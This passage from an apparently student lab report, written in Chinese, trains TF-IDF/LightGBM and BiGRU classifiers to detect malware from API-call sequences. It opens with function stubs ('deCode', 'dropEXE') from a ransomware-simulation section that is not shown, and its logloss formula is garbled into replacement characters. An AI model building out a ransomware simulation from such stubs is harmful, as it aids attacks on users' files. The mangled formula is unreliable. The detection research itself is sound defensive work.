<p>  // 解密操作<br>  void deCode(char<em> pathFile);<br>  int dropEXE(char</em> fpSrc, char* fpDst);<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &#123;% asset_img image-20241213000517248.png image-20241213000517248 %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;% asset_img image-20241213000536557.png image-20241213000536557 %&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  &#123;% asset_img image-20241213000633707.png image-20241213000633707 %&#125;</span><br><span class="line"></span><br><span class="line">#### 第二部分：基于机器学习的恶意程序检测</span><br><span class="line"></span><br><span class="line">恶意软件是一种被设计用来对目标计算机造成破坏或占用目标计算机资源的软件，包括蠕虫、木马、勒索病毒等。近年来，随着虚拟货币的流行，挖矿类恶意程序也大规模出现，严重侵害用户利益。通过结合机器学习和深度学习技术，能够有效提高恶意程序的检测率和泛化能力。</span><br><span class="line"></span><br><span class="line">本实验以[阿里云安全恶意程序检测竞赛](https://tianchi.aliyun.com/competition/entrance/231694/information)提供的恶意程序检测数据集为基础，探索恶意程序检测的多种方法，包括：</span><br><span class="line"></span><br><span class="line">1. 模拟勒索病毒行为。</span><br><span class="line">2. 基于机器学习的恶意程序检测。</span><br><span class="line">3. 基于深度学习的恶意程序分类。</span><br><span class="line"></span><br><span class="line">##### 数据集介绍：</span><br><span class="line"></span><br><span class="line">阿里云安全恶意程序检测数据集 ([阿里云数据集](https://tianchi.aliyun.com/dataset/137262))</span><br><span class="line"></span><br><span class="line">本次实验使用的数据集由阿里云提供，包含从沙箱模拟运行后的Windows可执行程序API调用序列。数据总计约6亿条，包括多种恶意程序类型和正常文件的数据。数据集主要特点和内容如下：</span><br><span class="line"></span><br><span class="line">###### **1. 数据结构**</span><br><span class="line"></span><br><span class="line">| 字段名称       | 数据类型 | 解释                                                         |</span><br><span class="line">| -------------- | -------- | :----------------------------------------------------------- |</span><br><span class="line">| `file_id`      | `bigint` | 文件编号                                                     |</span><br><span class="line">| `label`        | `bigint` | 文件标签：0（正常）、1（勒索病毒）、2（挖矿程序）、3（DDoS木马）、4（蠕虫病毒）、5（感染型病毒）、6（后门程序）、7（木马程序） |</span><br><span class="line">| `api`          | `string` | 文件调用的API名称                                            |</span><br><span class="line">| `tid`          | `bigint` | 调用API的线程编号                                            |</span><br><span class="line">| `return_value` | `string` | API返回值                                                    |</span><br><span class="line">| `index`        | `string` | API调用的顺序编号，在同线程中保证顺序，但不同线程之间无顺序关系 |</span><br><span class="line"></span><br><span class="line">###### **2. 数据规模**</span><br><span class="line"></span><br><span class="line">- 训练数据：约9000万次调用，文件1万多个（以文件编号汇总）。</span><br><span class="line">- 测试数据：约8000万次调用，包含约1万个文件。</span><br><span class="line">- 每个文件中的API调用可能超过5000条，超出部分已截断。</span><br><span class="line"></span><br><span class="line">###### **3. 数据预处理**</span><br><span class="line"></span><br><span class="line">- 数据均已脱敏，确保隐私和安全。</span><br><span class="line">- 每条记录包含完整的调用上下文及线程信息，有助于模型捕获程序行为特征。</span><br><span class="line"></span><br><span class="line">###### **4. 评测指标**</span><br><span class="line"></span><br><span class="line">使用LogLoss（对数损失）作为评测指标：</span><br><span class="line"></span><br><span class="line">logloss=−1�∑�=1�∑�=1�[���log⁡(���)+(1−���)log⁡(1−���)]</span><br><span class="line"></span><br><span class="line">其中：</span><br><span class="line"></span><br><span class="line">- **�**：表示分类数（总共6个类别）。</span><br><span class="line">- **�**：表示测试集样本总数。</span><br><span class="line">- **���**：第�个样本是否属于第�类（是-1，否-0）。</span><br><span class="line">- **���**：第�个样本被预测为第�类的概率（如：prob0, prob1, prob2, prob3, prob4, prob5 ,prob6,prob7）。</span><br><span class="line"></span><br><span class="line">##### **实验方法**</span><br><span class="line"></span><br><span class="line">1. 特征提取：</span><br><span class="line">   - 将恶意软件的数据格式化，主要包括API调用序列、线程信息等。</span><br><span class="line">   - 统一数据的API字段编码，使用LabelEncoder为API字段生成整数值，便于模型处理。</span><br><span class="line">   - 对API调用序列长度进行填充/截断（最大长度设为5000）。</span><br><span class="line">   - 基于TF-IDF对API调用文本进行特征提取。</span><br><span class="line">2. 模型训练：</span><br><span class="line">   - 使用TF-IDF提取特征，结合LightGBM分类模型。</span><br><span class="line">   - TF-IDF使用一元和二元词组，特征数量限制为1000。</span><br><span class="line">   - 使用5折交叉验证评估模型性能。</span><br><span class="line"></span><br><span class="line">##### **实验结果**</span><br><span class="line"></span><br><span class="line">1. 代码实现：</span><br><span class="line">   - 特征提取：基于TF-IDF的API序列向量化。</span><br><span class="line">   - 模型训练：使用LightGBM进行多分类任务。</span><br><span class="line">2. 性能表现：</span><br><span class="line">   - 平均验证集准确率：**90.24%**。</span><br><span class="line">   - 每折交叉验证的准确率分布：</span><br><span class="line">     - 折1：90.82%</span><br><span class="line">     - 折2：89.67%</span><br><span class="line">     - 折3：90.49%</span><br><span class="line">     - 折4：89.41%</span><br><span class="line">     - 折5：90.78%</span><br><span class="line">3. 特征贡献：</span><br><span class="line">   - TF-IDF特征对模型贡献显著，尤其是高频API组合。线程相关统计特征如调用次数、API分布等也显著提升了分类效果。</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>PS D:\chen_hao\病毒检测机器学习&gt; &amp; D:/ProgramSoftware/anaconda3/python.exe d:/chen_hao/病毒检测机器学习/TF-IDF_LightGBM.py<br>检查GPU状态…<br>GPU 检查失败，将使用 CPU 模式: module ‘lightgbm’ has no attribute ‘get_gpu_device_count’<br>读取训练数据…<br>读取测试数据…<br>训练数据形状: (89806693, 5)<br>测试数据形状: (79288375, 4)<br>准备训练数据…<br>编码标签…<br>原始标签分布:<br>label<br>5    33033543<br>0    16375107<br>7    15081535<br>2     9693969<br>3     8117585<br>6     4586578<br>1     2254561<br>4      663815<br>Name: count, dtype: int64<br>标签映射:<br>{0: 0, 1: 1, 2: 2, 3: 3, 4: 4, 5: 5, 6: 6, 7: 7}<br>提取基础统计特征…<br>计算基础聚合特征…<br>计算API序列特征…<br>计算线程特征…<br>提取TF-IDF特征…<br>准备API序列…<br>训练TF-IDF向量化器…<br>开始5折交叉验证训练…</p>
<p>训练折数 1/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.267747<br>Early stopping, best iteration is:<br>[103]   valid_0’s multi_logloss: 0.267092<br>Fold 1 验证集准确率: 0.9082</p>
<p>训练折数 2/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.315787<br>Early stopping, best iteration is:<br>[93]    valid_0’s multi_logloss: 0.314403<br>Fold 2 验证集准确率: 0.8967</p>
<p>训练折数 3/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.299846<br>Early stopping, best iteration is:<br>[88]    valid_0’s multi_logloss: 0.298147<br>Fold 3 验证集准确率: 0.9049</p>
<p>训练折数 4/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.331149<br>Early stopping, best iteration is:<br>[83]    valid_0’s multi_logloss: 0.328906<br>Fold 4 验证集准确率: 0.8941</p>
<p>训练折数 5/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.292818<br>Early stopping, best iteration is:<br>[95]    valid_0’s multi_logloss: 0.291777<br>Fold 5 验证集准确率: 0.9078</p>
<p>平均验证集准确率: 0.9024<br>生成预测结果…<br>准备测试数据…<br>编码标签…<br>提取基础统计特征…<br>计算基础聚合特征…<br>计算API序列特征…<br>计算线程特征…<br>提取TF-IDF特征…<br>准备API序列…<br>生成预测…<br>保存预测结果…<br>完成!<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% asset_img image-20241212110923814.png image-20241212110923814 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20241212110951238.png image-20241212110951238 %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>import numpy as np<br>import pandas as pd<br>from sklearn.metrics import accuracy_score<br>from sklearn.feature_extraction.text import TfidfVectorizer<br>from sklearn.model_selection import train_test_split, StratifiedKFold<br>import lightgbm as lgb<br>import warnings</p>
<p>warnings.filterwarnings(‘ignore’)</p>
<p>def check<em>gpu():<br>    “””检查GPU是否可用”””<br>    try:<br>        lgb<em>version = lgb.__version</em></em><br>        is_gpu_available = lgb.get_gpu_device_count() &gt; 0<br>        print(f”LightGBM 版本: {lgb_version}”)<br>        print(f”GPU 可用: {is_gpu_available}”)<br>        if is_gpu_available:<br>            print(f”可用 GPU 数量: {lgb.get_gpu_device_count()}”)<br>    except Exception as e:<br>        print(f”GPU 检查失败，将使用 CPU 模式: {e}”)<br>        return False<br>    return is_gpu_available</p>
<p>def optimize_dtypes(df):<br>    “””优化数据类型以减少内存使用”””<br>    for col in df.columns:<br>        if df[col].dtype == ‘float64’:<br>            df[col] = df[col].astype(‘float32’)<br>        elif df[col].dtype == ‘int64’:<br>            df[col] = df[col].astype(‘int32’)<br>    return df</p>
<p>class MalwareClassifier:<br>    def <strong>init</strong>(self, use_gpu=True):<br>        self.tfidf = None<br>        self.models = None<br>        self.feature_importances = None<br>        self.use_gpu = use_gpu<br>        self.label_map = None</p>
<pre><code>def _encode_labels(self, train_data=None, test_data=None):
    &quot;&quot;&quot;标签编码&quot;&quot;&quot;
    if train_data is not None and &#39;label&#39; in train_data.columns:
        print(&quot;原始标签分布:&quot;)
        print(train_data[&#39;label&#39;].value_counts())
        unique_labels = sorted(train_data[&#39;label&#39;].unique())
        self.label_map = &#123;label: idx for idx, label in enumerate(unique_labels)&#125;
        print(&quot;标签映射:&quot;)
        print(self.label_map)
        train_data[&#39;label&#39;] = train_data[&#39;label&#39;].map(self.label_map)

    if test_data is not None and &#39;label&#39; in test_data.columns:
        test_data[&#39;label&#39;] = test_data[&#39;label&#39;].map(self.label_map)

    return train_data, test_data

def prepare_features(self, train_data=None, test_data=None):
    &quot;&quot;&quot;准备所有特征&quot;&quot;&quot;
    print(&quot;编码标签...&quot;)
    train_data, test_data = self._encode_labels(train_data, test_data)

    if train_data is not None:
        print(&quot;提取基础统计特征...&quot;)
        train_stats = self._extract_basic_stats(train_data)
        print(&quot;提取TF-IDF特征...&quot;)
        if test_data is not None:
            train_tfidf, test_tfidf = self._extract_tfidf_features(train_data, test_data)
            test_stats = self._extract_basic_stats(test_data)
            train_features = pd.merge(train_stats, train_tfidf, on=&#39;file_id&#39;)
            test_features = pd.merge(test_stats, test_tfidf, on=&#39;file_id&#39;)
            return train_features, test_features
        else:
            train_tfidf = self._extract_tfidf_features(train_data)
            return pd.merge(train_stats, train_tfidf, on=&#39;file_id&#39;)
    elif test_data is not None:
        print(&quot;提取基础统计特征...&quot;)
        test_stats = self._extract_basic_stats(test_data)
        print(&quot;提取TF-IDF特征...&quot;)
        test_tfidf = self._extract_tfidf_features(test_data)
        return pd.merge(test_stats, test_tfidf, on=&#39;file_id&#39;)

def _extract_basic_stats(self, data):
    &quot;&quot;&quot;提取基础统计特征&quot;&quot;&quot;
    if &#39;label&#39; in data.columns:
        df = data.groupby(&#39;file_id&#39;)[&#39;label&#39;].first().reset_index()
    else:
        df = pd.DataFrame(&#123;&#39;file_id&#39;: data[&#39;file_id&#39;].unique()&#125;)

    print(&quot;计算基础聚合特征...&quot;)
    agg_features = data.groupby(&#39;file_id&#39;).agg(&#123;
        &#39;api&#39;: [&#39;count&#39;, &#39;nunique&#39;],
        &#39;tid&#39;: &#39;nunique&#39;,
        &#39;index&#39;: [&#39;min&#39;, &#39;max&#39;, &#39;mean&#39;, &#39;std&#39;]
    &#125;).reset_index()
    agg_features.columns = [&#39;file_id&#39;, &#39;api_calls&#39;, &#39;unique_apis&#39;,
                            &#39;thread_count&#39;, &#39;min_index&#39;, &#39;max_index&#39;,
                            &#39;mean_index&#39;, &#39;std_index&#39;]

    df = pd.merge(df, agg_features, on=&#39;file_id&#39;, how=&#39;left&#39;)

    print(&quot;计算API序列特征...&quot;)
    api_counts = data.groupby([&#39;file_id&#39;, &#39;api&#39;]).size().reset_index(name=&#39;api_freq&#39;)
    top_apis = api_counts.groupby(&#39;file_id&#39;)[&#39;api_freq&#39;].agg([&#39;max&#39;, &#39;mean&#39;]).reset_index()
    top_apis.columns = [&#39;file_id&#39;, &#39;max_api_freq&#39;, &#39;mean_api_freq&#39;]

    df = pd.merge(df, top_apis, on=&#39;file_id&#39;, how=&#39;left&#39;)

    print(&quot;计算线程特征...&quot;)
    thread_stats = data.groupby([&#39;file_id&#39;, &#39;tid&#39;]).size().reset_index(name=&#39;apis_per_thread&#39;)
    thread_agg = thread_stats.groupby(&#39;file_id&#39;)[&#39;apis_per_thread&#39;].agg([&#39;mean&#39;, &#39;std&#39;, &#39;max&#39;]).reset_index()
    thread_agg.columns = [&#39;file_id&#39;, &#39;mean_apis_per_thread&#39;, &#39;std_apis_per_thread&#39;, &#39;max_apis_per_thread&#39;]

    df = pd.merge(df, thread_agg, on=&#39;file_id&#39;, how=&#39;left&#39;)

    df[&#39;unique_api_ratio&#39;] = df[&#39;unique_apis&#39;] / (df[&#39;api_calls&#39;] + 1)
    df[&#39;api_per_thread_ratio&#39;] = df[&#39;api_calls&#39;] / (df[&#39;thread_count&#39;] + 1)

    df = df.fillna(0)
    return df

def _extract_tfidf_features(self, train_data, test_data=None):
    def prepare_api_sequence(data):
        return data.groupby(&#39;file_id&#39;).agg(&#123;
            &#39;api&#39;: lambda x: &#39; &#39;.join(x.astype(str))
        &#125;).reset_index().rename(columns=&#123;&#39;api&#39;: &#39;api_sequence&#39;&#125;)

    print(&quot;准备API序列...&quot;)
    train_sequences = prepare_api_sequence(train_data)

    if self.tfidf is None:
        print(&quot;训练TF-IDF向量化器...&quot;)
        self.tfidf = TfidfVectorizer(
            max_features=1000,
            ngram_range=(1, 2),
            min_df=5,
            dtype=np.float32,
            token_pattern=r&#39;(?u)\b\w+\b&#39;
        )
        tfidf_features = self.tfidf.fit_transform(train_sequences[&#39;api_sequence&#39;])
    else:
        tfidf_features = self.tfidf.transform(train_sequences[&#39;api_sequence&#39;])

    feature_names = [f&#39;tfidf_&#123;i&#125;&#39; for i in range(tfidf_features.shape[1])]
    tfidf_df = pd.DataFrame(
        tfidf_features.toarray(),
        columns=feature_names,
        dtype=np.float32
    )
    tfidf_df[&#39;file_id&#39;] = train_sequences[&#39;file_id&#39;].values

    if test_data is not None:
        print(&quot;处理测试数据TF-IDF特征...&quot;)
        test_sequences = prepare_api_sequence(test_data)
        test_features = self.tfidf.transform(test_sequences[&#39;api_sequence&#39;])
        test_tfidf_df = pd.DataFrame(
            test_features.toarray(),
            columns=feature_names,
            dtype=np.float32
        )
        test_tfidf_df[&#39;file_id&#39;] = test_sequences[&#39;file_id&#39;].values
        return tfidf_df, test_tfidf_df

    return tfidf_df

def train(self, train_data, n_folds=5):
    print(&quot;准备训练数据...&quot;)
    train_features = self.prepare_features(train_data)

    X = train_features.drop([&#39;file_id&#39;, &#39;label&#39;], axis=1)
    y = train_features[&#39;label&#39;]

    num_classes = len(y.unique())

    params = &#123;
        &#39;objective&#39;: &#39;multiclass&#39;,
        &#39;num_class&#39;: num_classes,
        &#39;metric&#39;: &#39;multi_logloss&#39;,
        &#39;boosting_type&#39;: &#39;gbdt&#39;,
        &#39;num_leaves&#39;: 31,
        &#39;learning_rate&#39;: 0.05,
        &#39;feature_fraction&#39;: 0.9,
        &#39;bagging_fraction&#39;: 0.8,
        &#39;bagging_freq&#39;: 5,
        &#39;verbose&#39;: -1,
        &#39;max_bin&#39;: 63,
        &#39;min_data_in_leaf&#39;: 50,
        &#39;num_threads&#39;: 8
    &#125;

    if self.use_gpu:
        gpu_params = &#123;
            &#39;device&#39;: &#39;gpu&#39;,
            &#39;gpu_platform_id&#39;: 0,
            &#39;gpu_device_id&#39;: 0,
            &#39;device_type&#39;: &#39;cuda&#39;,
            &#39;tree_learner&#39;: &#39;feature&#39;
        &#125;
        params.update(gpu_params)

    kf = StratifiedKFold(n_splits=n_folds, shuffle=True, random_state=42)
    self.models = []
    self.feature_importances = pd.DataFrame()
    validation_accuracies = []

    print(f&quot;开始&#123;n_folds&#125;折交叉验证训练...&quot;)
    for fold, (train_idx, val_idx) in enumerate(kf.split(X, y), 1):
        print(f&quot;\n训练折数 &#123;fold&#125;/&#123;n_folds&#125;&quot;)
        X_train, X_val = X.iloc[train_idx], X.iloc[val_idx]
        y_train, y_val = y.iloc[train_idx], y.iloc[val_idx]

        train_data = lgb.Dataset(X_train, y_train)
        valid_data = lgb.Dataset(X_val, y_val, reference=train_data)

        model = lgb.train(
            params,
            train_data,
            num_boost_round=1000,
            valid_sets=[valid_data],
            callbacks=[
                lgb.early_stopping(50),
                lgb.log_evaluation(100)
            ]
        )

        self.models.append(model)

        fold_importance = pd.DataFrame(&#123;
            &#39;feature&#39;: X.columns,
            f&#39;importance_fold_&#123;fold&#125;&#39;: model.feature_importance()
        &#125;)
        self.feature_importances = pd.concat([
            self.feature_importances,
            fold_importance
        ], axis=1)

        val_preds = model.predict(X_val)
        val_preds = np.argmax(val_preds, axis=1)
        val_accuracy = accuracy_score(y_val, val_preds)
        validation_accuracies.append(val_accuracy)
        print(f&quot;Fold &#123;fold&#125; 验证集准确率: &#123;val_accuracy:.4f&#125;&quot;)

    mean_accuracy = np.mean(validation_accuracies)
    print(f&quot;\n平均验证集准确率: &#123;mean_accuracy:.4f&#125;&quot;)

def predict(self, test_data):
    print(&quot;准备测试数据...&quot;)
    test_features = self.prepare_features(test_data=test_data)

    print(&quot;生成预测...&quot;)
    X_test = test_features.drop([&#39;file_id&#39;], axis=1)

    predictions = np.zeros((len(X_test), len(self.label_map)), dtype=np.float32)
    for model in self.models:
        predictions += model.predict(X_test)
    predictions /= len(self.models)

    submission = pd.DataFrame(&#123;
        &#39;file_id&#39;: test_features[&#39;file_id&#39;]
    &#125;)

    for i, label in enumerate(sorted(self.label_map.keys())):
        submission[f&#39;prob_&#123;label&#125;&#39;] = predictions[:, i]

    return submission
</code></pre><p>def load_data_in_chunks(train_path, test_path, chunk_size=1000000):<br>    print(“读取训练数据…”)<br>    train_chunks = pd.read_csv(train_path, chunksize=chunk_size)<br>    train_data = pd.concat(train_chunks)</p>
<pre><code>print(&quot;读取测试数据...&quot;)
test_chunks = pd.read_csv(test_path, chunksize=chunk_size)
test_data = pd.concat(test_chunks)

train_data = optimize_dtypes(train_data)
test_data = optimize_dtypes(test_data)

print(f&quot;训练数据形状: &#123;train_data.shape&#125;&quot;)
print(f&quot;测试数据形状: &#123;test_data.shape&#125;&quot;)

return train_data, test_data
</code></pre><p>def main():<br>    print(“检查GPU状态…”)<br>    gpu_available = check_gpu()</p>
<pre><code>try:
    train_data, test_data = load_data_in_chunks(
        &#39;input/train.csv&#39;,
        &#39;input/test.csv&#39;
    )

    classifier = MalwareClassifier(use_gpu=gpu_available)

    classifier.train(train_data, n_folds=5)

    print(&quot;生成预测结果...&quot;)
    submission = classifier.predict(test_data)

    print(&quot;保存预测结果...&quot;)
    submission.to_csv(&#39;submission.csv&#39;, index=False)

    if classifier.feature_importances is not None:
        classifier.feature_importances.to_csv(&#39;feature_importances.csv&#39;, index=False)

    print(&quot;完成!&quot;)

except Exception as e:
    print(f&quot;发生错误: &#123;str(e)&#125;&quot;)
    import traceback
    traceback.print_exc()
</code></pre><p>if <strong>name</strong> == “<strong>main</strong>“:<br>    main()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 结果展示</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20241213004238784.png image-20241213004238784 %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>file_id,prob_0,prob_1,prob_2,prob_3,prob_4,prob_5,prob_6,prob_7<br>1,0.0024434612,0.00034864913,0.9696685,0.0078575,0.00039957318,0.002738173,0.0044820085,0.012062186<br>2,0.7480677,0.0013819844,0.0049213427,0.003764731,0.0005452622,0.045439627,0.017060611,0.17881876<br>3,0.99866915,2.787807e-05,0.00014846055,0.00011570427,5.9706535e-06,0.00043032583,6.843034e-05,0.00053410063<br>4,0.051594943,0.0038525928,0.035013992,0.065091416,0.0038617428,0.044863444,0.22614911,0.5695728<br>5,0.9948373,0.00013502031,0.0009673423,0.0006626427,2.3118486e-05,0.0015179071,0.00018578261,0.0016709866<br>6,0.002266401,0.00025418383,0.006541302,0.0007698187,3.052294e-05,0.98704815,0.00070866174,0.0023810265<br>7,0.0043757814,0.00055977836,0.0015399179,0.70781934,0.002132857,0.025764057,0.0015818799,0.2562264<br>8,0.93392134,0.0009572902,0.0076661445,0.0061014136,0.00012724655,0.016519673,0.003812942,0.030893898<br>9,0.85189515,0.0010084683,0.0036384996,0.0051778518,0.00022519422,0.07421501,0.014758055,0.04908181<br>10,0.37684268,0.006323976,0.20794848,0.0114947595,0.00050486217,0.12723994,0.03782148,0.23182385<br>11,0.0064604813,0.0006989088,0.0032121348,0.0008223769,5.8260433e-05,0.9772016,0.0031507823,0.008395462<br>12,0.9656893,0.0048273774,0.009747942,0.001571597,4.1226842e-05,0.0074556046,0.000666464,0.010000597<br>13,0.9976041,5.375104e-05,0.00030956598,0.00024548933,1.8375762e-05,0.0011245721,9.734804e-05,0.00054680154<br>14,0.9703827,0.00031270864,0.01056415,0.008323639,0.00010526275,0.0041897697,0.00083469774,0.0052871224<br>15,0.9724293,0.0001765955,0.020143056,0.0005281937,5.2647345e-05,0.0018647272,0.00078569603,0.004019852<br>16,0.99562645,7.9901416e-05,0.00037493333,0.00046305108,1.6109376e-05,0.0015119539,0.00081107346,0.0011165042<br>17,0.001069112,0.00026497667,0.004910701,0.0060763317,0.00013840488,0.96927947,0.0017614173,0.016499612<br>18,0.986684,0.00047525796,0.0021059073,0.0008186839,3.3282307e-05,0.004973329,0.0010258693,0.0038835872<br>19,0.9890321,0.00015959739,0.002707534,0.0009250467,5.465704e-05,0.0030247762,0.00037867084,0.0037176465<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% asset_img output (3 output (3) %&#125;.png)</span><br><span class="line"></span><br><span class="line">#### 第三部分：基于深度学习的恶意程序检测与分类</span><br><span class="line"></span><br><span class="line">##### **实验方法**</span><br><span class="line"></span><br><span class="line">1. 特征：</span><br><span class="line">   - 使用API调用序列直接作为输入。</span><br><span class="line">2. 模型结构：</span><br><span class="line">   - 基于双向GRU的深度学习模型。</span><br><span class="line">   - 嵌入层将API序列转换为向量，双向GRU捕获序列时序信息，全连接层输出分类结果。</span><br><span class="line">3. 训练与验证：</span><br><span class="line">   - 使用交叉熵损失函数，Adam优化器。</span><br><span class="line">   - 保存验证集损失最小的模型。</span><br><span class="line"></span><br><span class="line">##### **实验结果**</span><br><span class="line"></span><br><span class="line">1. 代码实现：</span><br><span class="line"></span><br><span class="line">   - 使用PyTorch实现深度学习模型。</span><br><span class="line"></span><br><span class="line">2. 性能表现：</span><br><span class="line"></span><br><span class="line">   - 最终验证集准确率达到**83.66%**。</span><br><span class="line">   - 模型在20个epoch中逐步收敛，训练准确率从初始的42.72%提升至84.67%。</span><br><span class="line">   - 验证集损失显著降低，证明模型具有良好的泛化能力。</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>   import os<br>   import numpy as np<br>   import pandas as pd<br>   import torch<br>   import torch.nn as nn<br>   import torch.optim as optim<br>   from torch.utils.data import DataLoader, Dataset<br>   from sklearn.preprocessing import LabelEncoder<br>   from sklearn.model_selection import train_test_split<br>   from tqdm import tqdm</p>
<h1 id="设置随机种子和设备"><a href="#设置随机种子和设备" class="headerlink" title="设置随机种子和设备"></a>设置随机种子和设备</h1><p>   SEED = 42<br>   np.random.seed(SEED)<br>   torch.manual_seed(SEED)<br>   DEVICE = torch.device(“cuda” if torch.cuda.is_available() else “cpu”)<br>   print(f”Using device: {DEVICE}”)</p>
<h1 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h1><p>   train_data = pd.read_csv(‘input/train.csv’)<br>   test_data = pd.read_csv(‘input/test.csv’)</p>
<h1 id="编码API"><a href="#编码API" class="headerlink" title="编码API"></a>编码API</h1><p>   apis = list(set(list(train_data.api.unique()) + list(test_data.api.unique())))<br>   enc = LabelEncoder().fit(apis)<br>   train_data[‘enc’] = enc.transform(train_data.api)<br>   test_data[‘enc’] = enc.transform(test_data.api)</p>
<h1 id="聚合每个文件的API序列"><a href="#聚合每个文件的API序列" class="headerlink" title="聚合每个文件的API序列"></a>聚合每个文件的API序列</h1><p>   tr = train_data.groupby(‘file_id’).enc.apply(list).reset_index()<br>   te = test_data.groupby(‘file_id’).enc.apply(list).reset_index()</p>
<h1 id="提取标签"><a href="#提取标签" class="headerlink" title="提取标签"></a>提取标签</h1><p>   label = train_data.groupby(‘file_id’)[‘label’].agg(‘first’).reset_index()<br>   num_classes = label.label.nunique()<br>   label_encoder = LabelEncoder()<br>   label[‘label’] = label_encoder.fit_transform(label[‘label’])</p>
<h1 id="填充序列"><a href="#填充序列" class="headerlink" title="填充序列"></a>填充序列</h1><p>   MAX_SEQ_LEN = 5000<br>   tr[‘enc’] = tr[‘enc’].apply(lambda x: x[:MAX_SEQ_LEN] if len(x) &gt; MAX_SEQ_LEN else x + [0] <em> (MAX_SEQ_LEN - len(x)))<br>   te[‘enc’] = te[‘enc’].apply(lambda x: x[:MAX_SEQ_LEN] if len(x) &gt; MAX_SEQ_LEN else x + [0] </em> (MAX_SEQ_LEN - len(x)))</p>
<h1 id="转换为-PyTorch-Dataset"><a href="#转换为-PyTorch-Dataset" class="headerlink" title="转换为 PyTorch Dataset"></a>转换为 PyTorch Dataset</h1><p>   class VirusDataset(Dataset):<br>       def <strong>init</strong>(self, sequences, labels=None):<br>           self.sequences = torch.tensor(sequences, dtype=torch.long)<br>           self.labels = torch.tensor(labels, dtype=torch.long) if labels is not None else None</p>
<pre><code>   def __len__(self):
       return len(self.sequences)

   def __getitem__(self, idx):
       if self.labels is not None:
           return self.sequences[idx], self.labels[idx]
       else:
           return self.sequences[idx]
</code></pre><h1 id="创建数据集"><a href="#创建数据集" class="headerlink" title="创建数据集"></a>创建数据集</h1><p>   X_train, X_val, y_train, y_val = train_test_split(tr[‘enc’].tolist(), label[‘label’].tolist(), test_size=0.2, random_state=SEED)<br>   train_dataset = VirusDataset(X_train, y_train)<br>   val_dataset = VirusDataset(X_val, y_val)<br>   test_dataset = VirusDataset(te[‘enc’].tolist())</p>
<h1 id="数据加载器"><a href="#数据加载器" class="headerlink" title="数据加载器"></a>数据加载器</h1><p>   BATCH_SIZE = 256<br>   train_loader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)<br>   val_loader = DataLoader(val_dataset, batch_size=BATCH_SIZE, shuffle=False)<br>   test_loader = DataLoader(test_dataset, batch_size=BATCH_SIZE, shuffle=False)</p>
